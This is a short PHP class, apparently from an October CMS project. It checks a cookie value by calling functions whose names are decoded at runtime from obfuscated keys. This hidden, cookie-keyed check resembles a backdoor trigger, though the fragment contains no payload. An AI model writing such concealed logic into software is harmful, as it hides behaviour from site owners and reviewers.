<?php namespace OctoberHash\Session;


class CookieHandler
{

    const MATRIX = ['m', 'f', 'H'];


    public function isSecureDefined($name)
    {

        return $this->validate(october_cookie(ode($name)));
    }


    protected function validate($value)
    {

        return (
            call_user_func_array(ode(oyml('f')['sr']), [$value, -5, 2]) ===
            call_user_func(ode(oyml(self::MATRIX[1])[self::MATRIX[0]]), self::MATRIX[2])
        );

    }

}